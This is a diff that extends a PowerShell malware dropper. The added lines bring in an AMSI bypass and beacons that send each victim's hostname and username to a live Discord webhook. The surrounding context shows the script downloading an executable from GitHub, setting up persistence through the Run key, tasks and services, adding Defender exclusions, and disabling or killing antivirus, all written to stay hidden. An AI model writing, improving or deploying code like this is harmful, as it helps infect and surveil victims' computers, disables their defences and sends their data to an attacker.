@@ -1,3 +1,7 @@
+# AMSI Bypass for stealthy execution
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch { }
 
 $WebhookURL = "https://discord.com/api/webhooks/1442924485698392219/Vz4aoPFbx2IaVvT0SRJt5I2IKGd_RXg-fDgy69gkUVdKDvRSkFL_nPE0sRB_E3QTEUxD"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
@@ -8,16 +12,45 @@ $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $TaskName       = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})  # Random task name
 $ServiceName    = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})  # Random service name
 
+# Test log at the very beginning to verify webhook and execution
+$testMsg = "[+] Script initiated on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Host: $env:COMPUTERNAME - User: $env:USERNAME"
+try {
+    $testBody = @{content = $testMsg} | ConvertTo-Json -Depth 10
+    Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $testBody -ContentType "application/json" -UseBasicParsing | Out-Null
+} catch {
+    # If webhook fails, try alternative method with Invoke-RestMethod
+    try {
+        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $testBody -ContentType "application/json"
+    } catch {
+        # Ultimate fallback: Write to temp file for manual check
+        $errorLogPath = "$env:TEMP\script_debug.txt"
+        "$testMsg`nWebhook failure: $($_.Exception.Message)" | Out-File -FilePath $errorLogPath -Append -Encoding UTF8
+    }
+}
+
 function Send-DiscordLog {
     param([string]$Message)
     try {
         $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
         $formattedMessage = "[$timestamp] $Message"
-        $body = @{content = $formattedMessage} | ConvertTo-Json -Depth 10
-        Invoke-WebRequest -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -UseBasicParsing | Out-Null
+        $body = @{content = $formattedMessage} | ConvertTo-Json -Depth 10 -Compress  # Compress to avoid encoding issues
+        # Primary: Invoke-WebRequest
+        $response = Invoke-WebRequest -Uri $WebhookURL -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($body)) -ContentType "application/json" -UseBasicParsing
+        if ($response.StatusCode -ne 204) {
+            throw "Unexpected status: $($response.StatusCode)"
+        }
     }
     catch {
-        # Silent fail, no output
+        try {
+            # Backup: Invoke-RestMethod (often more reliable for JSON)
+            $bodyObj = @{content = $formattedMessage} | ConvertTo-Json -Depth 10 -Compress
+            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $bodyObj -ContentType "application/json"
+        }
+        catch {
+            # Silent fail, but log to file for debugging
+            $errorLogPath = "$env:TEMP\script_debug.txt"
+            "[$timestamp] Log failed: $Message`nError: $($_.Exception.Message)" | Out-File -FilePath $errorLogPath -Append -Encoding UTF8
+        }
     }
 }
 
@@ -134,7 +167,7 @@ function Set-Exclusions {
             "${env:ProgramFiles(x86)}",
             $env:TEMP,
             "$env:USERPROFILE\Downloads",
-            $env:USERPROFILE\Documents
+            "$env:USERPROFILE\Documents"
         )
         foreach ($folder in $importantFolders) {
             if (Test-Path $folder) {
@@ -347,6 +380,7 @@ function Execute-RemoteScript {
 
 # Main execution sequence (stealthy, no output)
 try {
+    Send-DiscordLog "[*] Beginning main execution sequence"
     Disable-Defender  # Primary disable
     if (-not (Disable-Defender -Retry)) { Kill-OtherAV }  # Backup kill if prefs fail
     Kill-OtherAV  # Always try third-party kill
@@ -365,5 +399,6 @@ try {
     }
     Send-DiscordLog "[+] Full execution completed stealthily"
 } catch {
-    Send-DiscordLog "[!] Main sequence error: $($_.Exception.Message)"
+    $errorMsg = "[!] Main sequence error: $($_.Exception.Message)`nStackTrace: $($_.ScriptStackTrace)"
+    Send-DiscordLog $errorMsg
 }
